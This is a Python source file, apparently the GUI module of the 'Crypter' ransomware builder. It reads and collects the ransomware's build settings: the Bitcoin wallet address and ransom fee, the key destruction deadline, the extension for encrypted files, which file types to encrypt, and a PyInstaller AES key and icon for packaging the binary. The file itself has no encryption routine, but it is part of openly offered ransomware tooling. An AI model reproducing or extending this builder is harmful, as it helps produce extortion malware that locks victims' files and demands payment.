# -*- coding: utf-8 -*-
'''
@summary: Crypter Builder: Provides GUI functionality
@author: MLS
'''

# Import libs
import wx

# Import package modules
from .BuilderGuiAbsBase import MainFrame
from .Base import *

###############
## GUI CLASS ##
###############
class Gui(MainFrame):
    '''
    @summary: Provides a GUI object
    '''
    
    def __init__(self, validate, config_dict):
        '''
        @summary: Constructor
        @param validate: Reference to the Builder validate method
        @param config_dict: The build configuration, if present
        '''
        self.validate = validate
        self.language = DEFAULT_LANGUAGE
        
        # Init super - MainFrame
        MainFrame.__init__( self, parent=None )
        
        # Set initial event handlers
        self.set_events()
        
        # Update configuration
        self.update_config_values(config_dict)
        
    
    def update_config_values(self, config_dict):
        '''
        @summary: Updates the GUI field values with those in the config_dict
        @param config_dict: The config dict loaded from the build config file, if any
        '''
        
        # Parse values
        if config_dict:
            # Builder Language
            if "builder_language" in config_dict:
                if unicode(config_dict["builder_language"]) not in SUPPORTED_LANGUAGES:
                    self.BuilderLanguageChoice.SetString(0, DEFAULT_LANGUAGE)
                else:
                    self.BuilderLanguageChoice.SetString(0, config_dict["builder_language"])
                    if config_dict["builder_language"] != self.language:
                        self.update_language(None, language=config_dict["builder_language"])
            # Binary Language
            if "binary_language" in config_dict:
                if unicode(config_dict["binary_language"]) not in SUPPORTED_LANGUAGES:
                    self.CrypterBinaryLanguageChoice.SetString(0, DEFAULT_LANGUAGE)
                else:
                    self.CrypterBinaryLanguageChoice.SetString(0, config_dict["binary_language"])
            # Major Version
            if "maj_version" in config_dict:
                self.MajorVersionTextCtrl.SetValue(config_dict["maj_version"])
            # Minor Version
            if "min_version" in config_dict:
                self.MinorVersionTextCtrl.SetValue(config_dict["min_version"])
            # Filename
            if "filename" in config_dict:
                self.FilenameTextCtrl.SetValue(config_dict["filename"])
            # Extension
            if "extension" in config_dict:
                self.ExtensionTextCtrl.SetValue(config_dict["extension"])
            # PyInstaller AES Key
            if "pyinstaller_aes_key" in config_dict:
                self.PyInstallerAesKeyTextCtrl.SetValue(config_dict["pyinstaller_aes_key"].upper())
            # PyInstaller AES Key
            if "pyinstaller_aes_key" in config_dict:
                self.PyInstallerAesKeyTextCtrl.SetValue(config_dict["pyinstaller_aes_key"].upper())
            # Icon File
            if "icon_file" in config_dict:
                self.IconFilePicker.SetPath(config_dict["icon_file"])
            # Encrypted File Extension
            if "encrypted_file_extension" in config_dict:
                self.EncryptedFileExtensionTextCtrl.SetValue(config_dict["encrypted_file_extension"])
            # Wallet Address
            if "wallet_address" in config_dict:
                self.WalletAddressTextCtrl.SetValue(config_dict["wallet_address"])
            # Bitcoin Fee
            if "bitcoin_fee" in config_dict:
                self.BitcoinFeeTextCtrl.SetValue(config_dict["bitcoin_fee"])
            # Key Destruction time
            if "key_destruction_time" in config_dict:
                self.KeyDestructionTimeTextCtrl.SetValue(config_dict["key_destruction_time"])
            # Max file size to encrypt
            if "max_file_size_to_encrypt" in config_dict:
                self.MaxFileSizeTextCtrl.SetValue(config_dict["max_file_size_to_encrypt"])
            # Filetypes to encrypt
            if "filetypes_to_encrypt" in config_dict:
                filetypes = ",".join(config_dict["filetypes_to_encrypt"])
                self.FiletypesToEncryptTextCtrl.SetValue(filetypes)
            
    
    def set_events(self):
        '''
        @summary: Set GUI events for the various controls
        '''
        
        # Catch Language choice changes
        self.Bind(wx.EVT_CHOICE, self.update_language, self.BuilderLanguageChoice)

        # BUILD button
        self.Bind(wx.EVT_BUTTON, self.__validate, self.BuildButton)
        
        
    def update_language(self, event, language=None):
        '''
        @summary: Updates the Builder GUI language to the selected choice
        @param language: The language to change the form to. This is only provided when
        called directly, and not through a wx Event
        '''
        
        if not event:
            if language == "English":
                self.language = "English"
                #print("Changing language to English")
            

        
    def __validate(self, event):
        '''
        @summary: Validates the Build configuration input
        '''
        config_dict = {}
        
        # Read the form contents and pass to Builder validate
        # Major Version
        config_dict["maj_version"] = self.MajorVersionTextCtrl.GetValue()
        # Minor Version
        config_dict["min_version"] = self.MinorVersionTextCtrl.GetValue()
        # Filename
        config_dict["filename"] = self.FilenameTextCtrl.GetValue()
        # Filename
        config_dict["extension"] = self.ExtensionTextCtrl.GetValue()
        # PyInstaller AES Key
        config_dict["pyinstaller_aes_key"] = self.PyInstallerAesKeyTextCtrl.GetValue()
        # PyInstaller AES Key
        config_dict["icon_file"] = self.IconFilePicker.GetPath()
        # Encrypted File Extension
        config_dict["encrypted_file_extension"] = self.EncryptedFileExtensionTextCtrl.GetValue()
        # Wallet Address
        config_dict["wallet_address"] = self.WalletAddressTextCtrl.GetValue()
        # Bitcoin Fee
        config_dict["bitcoin_fee"] = self.BitcoinFeeTextCtrl.GetValue()
        # Key Destruction Time
        config_dict["key_destruction_time"] = self.KeyDestructionTimeTextCtrl.GetValue()
        # Max file size to encrypt
        config_dict["max_file_size_to_encrypt"] = self.MaxFileSizeTextCtrl.GetValue()
        # Max file size to encrypt
        config_dict["filetypes_to_encrypt"] = self.FiletypesToEncryptTextCtrl.GetValue()

        # Call validator
        self.validate(config_dict)
    
    
    
    
    
    